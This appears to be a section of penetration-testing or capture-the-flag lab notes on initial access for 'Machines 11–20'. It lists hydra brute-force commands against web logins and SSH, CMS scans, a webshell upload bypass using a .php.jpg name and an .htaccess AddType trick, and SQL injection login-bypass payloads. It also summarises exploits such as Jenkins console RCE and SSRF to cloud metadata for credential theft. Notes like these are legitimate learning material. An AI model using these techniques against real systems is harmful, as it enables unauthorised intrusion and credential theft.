## 🔓 Initial Access (Machines 11–20)

```bash
# Found exposed configuration and sensitive data
curl http://<IP>/config.php | grep password

# Brute-forced login pages or SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l user -P rockyou.txt ssh://<IP>

# CMS vulnerability scans
wpscan --url http://<IP> --enumerate vp
joomscan --url http://<IP>
```

### File Upload & Bypass Techniques

```bash
# Upload webshell with bypass
shell.php.jpg
# .htaccess trick to execute shell.jpg as PHP
AddType application/x-httpd-php .jpg

# Access uploaded shell
curl http://<IP>/uploads/shell.php
```

### Authentication Bypass

```bash
# SQLi payloads
admin'-- -
' or 1=1 --

# Decode and tamper with JWT
echo -n 'payload' | base64 -d
```

### Notable Examples

- Machine 11: Admin bypass via SQLi in login page.
- Machine 12: File upload vulnerability exploited with .php.jpg trick.
- Machine 13: Apache Tomcat manager console allowed WAR deployment.
- Machine 15: Jenkins script console exploited for RCE.
- Machine 17: Unauthenticated access exposed credentials.
- Machine 18: SQLi → user dump → SSH reuse.
- Machine 19: SSRF to access cloud metadata → credential theft.
- Machine 20: WordPress plugin upload led to webshell access.
